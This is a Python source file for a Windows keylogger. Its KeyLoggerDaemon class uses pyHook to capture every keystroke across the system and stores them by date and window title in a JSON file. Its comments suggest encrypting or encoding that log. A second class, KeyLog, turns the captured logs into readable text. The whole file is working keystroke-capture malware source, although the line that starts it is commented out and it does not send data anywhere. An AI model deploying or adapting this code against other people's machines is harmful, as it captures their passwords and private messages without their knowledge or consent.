import json
from datetime import date

import pyHook
import pythoncom


class KeyLoggerDaemon:
    """
    A basic implementation of a python key logger
    stores logged keys per-window per-date in a json format

    buffer is writen to disk on each key stroke (better solution required)

    buffer structure - {date: {windows name: [list of keystrokes]}}

    Considerations:
        - PyHook isn't great and can miss keystrokes
        - Can cause a noticeable slow down on older machines
        - Window may not always be identifiable
        - All keystrokes are returned in uppercase (may be able to fix this with ASCII repr)
        - commas, brackets, hashes etc are returned as Oem_nameOfPunctuation (may be able to fix this with ASCII repr)
    """
    __LOG_FILE: str = "LOG.json"  # log file path

    def __init__(self):
        self.__hook = hook = pyHook.HookManager()
        hook.KeyDown = self.__write_event

        try:
            self.buffer = self.__load_buffer()
        except (FileNotFoundError, json.decoder.JSONDecodeError):
            self.buffer = dict()

    def __write_event(self, event: pyHook.KeyboardEvent):
        """
        keyboard press callback, process each key press as necessary.
        the buffer is written out on every key event
        """
        print(event.WindowName, event.Key, chr(int(event.Ascii)))  # debug

        if str(date.today()) not in self.buffer:  # check if current date in dict
            self.buffer[str(date.today())] = dict()
        if event.WindowName not in self.buffer[str(date.today())]:  # check if window already in dict
            self.buffer[str(date.today())][event.WindowName] = list()

        key = chr(int(event.Ascii))

        if key == '\x00':
            key = event.Key

        self.buffer[str(date.today())][event.WindowName].append(key)  # add event to buffer

        # if event.Ascii == 13 or event.Ascii == 9:  # when enter or tab is pressed the buffer is dumped
        self.__dump_buffer()  # dump buffer, inefficient but works more reliably

        return True  # required by hook manager

    def __load_buffer(self) -> dict:
        """
        Reads and loads the json buffer from disk
        other wise will be over written on next write

        Custom loading functionality can be added here
        e.g decryption, decoding, etc.

        :return: buffer
        """
        return json.load(open(self.__LOG_FILE, "r"))

    def __dump_buffer(self):
        """
        Dumps json to log file
        if file doesnt exist it is created

        Custom dumping functionality can be added here
        e.g encryption, encoding, etc.
        """
        json.dump(self.buffer, open(self.__LOG_FILE, "w"))

    def watch(self):
        """
        Starts the hook event loop
        """
        self.__hook.HookKeyboard()
        pythoncom.PumpMessages()


class KeyLog:
    """
    processes and prettifies key logger logs
    """

    def __init__(self, log: dict):
        self.log = log

    @property
    def windows(self) -> tuple:
        windows = list()
        for key in self.log:
            windows += self.log[key].keys()
        return tuple(windows)

    @property
    def dates(self) -> tuple:
        return tuple(self.log.keys())

    @property
    def raw_log(self):
        return self.log

    def prettify(self) -> str:
        mapping = {"shift" + k: v for k, v in zip("1234567890-=[];'#,./", "!\"£$%^&*()_+{}:@~<>?")}
        space = " "
        tab = "     "
        nl = "\n"
        final_out = str()
        for log_date in self.dates:
            final_out += log_date + nl
            for window in self.log[log_date]:
                final_out += tab + window + nl + tab + tab
                for key in self.log[log_date][window]:
                    if key == "Return":
                        final_out += nl + tab + tab + key + nl + tab + tab
                    elif key == "Back":
                        final_out += space + key + space
                    elif key == "Space":
                        final_out += space
                    elif key in ("Lcontrol", "Rcontrol"):
                        final_out += space + "ctrl" + space
                    elif key in ("Volume_Up", "Volume_Down", "Down", "Up", "Left", "Right"):
                        continue
                    else:
                        final_out += key
                final_out += nl

        for key in mapping:  # corrects shifted characters
            final_out = final_out.replace(key, mapping[key])

        return final_out


#KeyLoggerDaemon().watch()
